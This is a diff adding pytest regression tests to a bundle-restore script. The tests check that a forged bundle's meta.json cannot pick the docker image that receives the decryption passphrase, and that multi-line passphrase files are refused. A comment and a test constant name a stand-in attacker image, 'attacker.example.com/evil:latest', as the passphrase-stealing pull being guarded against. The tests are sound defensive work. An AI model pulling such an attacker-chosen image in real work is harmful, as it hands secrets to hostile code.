@@ -328,3 +328,111 @@ def test_a_lying_cryptography_with_nothing_else_still_refuses(bundle, tmp_path):
     assert "no way to decrypt this bundle on this machine" in done.stderr
     assert "verified" not in done.stdout
     assert "/nonexistent/libcrypto.so" in done.stderr, "the refusal names what it was told to use"
+
+
+# ── the bundle does not choose the code that opens it ───────────────────────
+#
+# Backends 3 and 4 `docker pull` an image, run it, and feed the operator's
+# passphrase to that image on stdin. Reading the name out of cleartext
+# meta.json therefore let a hostile bundle pick the code that sees the
+# passphrase — measured with a recording stub: `docker pull
+# attacker.example.com/evil:latest`. The known-answer test does not cover it:
+# the KAT runs INSIDE the chosen image.
+
+EVIL = "attacker.example.com/evil:latest"
+
+DOCKER_RECORDER_OK = """#!/bin/sh
+printf '%s\\n' "$*" >> "$NOVA_TEST_DOCKER_LOG"
+exit 1
+"""
+
+
+def _hostile_image_bundle(tmp_path):
+    from bundle_fixtures import forge_bundle
+
+    return forge_bundle(
+        tmp_path,
+        lambda manifest: None,
+        name="hostile-image.tar",
+        crypto_image=EVIL,
+        fallback_image=EVIL,
+        needs_images=(EVIL,),
+    )[0]
+
+
+def test_a_bundle_cannot_name_the_image_that_opens_it(tmp_path):
+    bundle = _hostile_image_bundle(tmp_path)
+    dlog = tmp_path / "docker.log"
+    path = bin_dir(tmp_path, docker=DOCKER_RECORDER_OK)  # docker only: forces backends 3 and 4
+    done = run_sh(bundle, path, "--verify-only", extra_env={"NOVA_TEST_DOCKER_LOG": str(dlog)})
+    assert done.returncode == 1
+    recorded = dlog.read_text() if dlog.exists() else ""
+    assert EVIL not in recorded, (
+        f"the bundle chose the image that would see the passphrase:\n{recorded}"
+    )
+    assert "python:3.12-slim" in recorded
+    assert EVIL not in done.stderr, "and it does not get to print a docker pull line either"
+
+
+def test_the_operator_can_name_the_image_himself(tmp_path):
+    """The value may come from him, in his own shell — never from the file."""
+    bundle = _hostile_image_bundle(tmp_path)
+    dlog = tmp_path / "docker.log"
+    path = bin_dir(tmp_path, docker=DOCKER_RECORDER_OK)
+    done = run_sh(
+        bundle,
+        path,
+        "--verify-only",
+        extra_env={
+            "NOVA_TEST_DOCKER_LOG": str(dlog),
+            "NOVA_FALLBACK_IMAGE": "python:3.13-slim",
+        },
+    )
+    assert done.returncode == 1
+    assert "python:3.13-slim" in dlog.read_text()
+
+
+def test_restore_sh_reads_no_value_out_of_meta_json():
+    """Mechanical, not a promise: nothing in this script names meta.json as a
+    source. It is still extracted, because §5.1 says a bundle carries it."""
+    source = RESTORE_SH.read_text()
+    assert "meta_str" not in source
+    assert "meta_list" not in source
+    assert "sed -n" not in source, "no hand-rolled JSON reading remains"
+    assert "NOVA_CRYPTO_IMAGE:-nova-core" in source
+    assert "NOVA_FALLBACK_IMAGE:-python:3.12-slim" in source
+
+
+# ── a multi-line passphrase file is refused, not cut ────────────────────────
+
+
+def test_a_multi_line_passphrase_file_is_refused(bundle, tmp_path):
+    """nova_restore.py reads the FIRST LINE of stdin, so a file like this
+    would be silently cut and the run would fail the KAT with a sentence
+    about the bundle."""
+    path = bin_dir(tmp_path, python3=REAL_PYTHON)
+    passfile = tmp_path / "pass.txt"
+    passfile.write_text(PASSPHRASE + "\nsecond line\n")
+    done = subprocess.run(
+        ["sh", str(RESTORE_SH), str(bundle), "--verify-only", "--passphrase-file", str(passfile)],
+        capture_output=True,
+        text=True,
+        env={"PATH": str(path), "TMPDIR": os.environ.get("TMPDIR", "/tmp")},
+    )
+    assert done.returncode == 2
+    assert "more than one line" in done.stderr
+    assert "verified" not in done.stdout
+
+
+def test_a_single_line_passphrase_file_still_works(bundle, tmp_path):
+    path = bin_dir(tmp_path, python3=REAL_PYTHON)
+    passfile = tmp_path / "pass.txt"
+    passfile.write_text(PASSPHRASE + "\n")
+    done = subprocess.run(
+        ["sh", str(RESTORE_SH), str(bundle), "--verify-only", "--passphrase-file", str(passfile)],
+        capture_output=True,
+        text=True,
+        env={"PATH": str(path), "TMPDIR": os.environ.get("TMPDIR", "/tmp")},
+    )
+    assert done.returncode == 0, done.stderr
+    assert "verified" in done.stdout
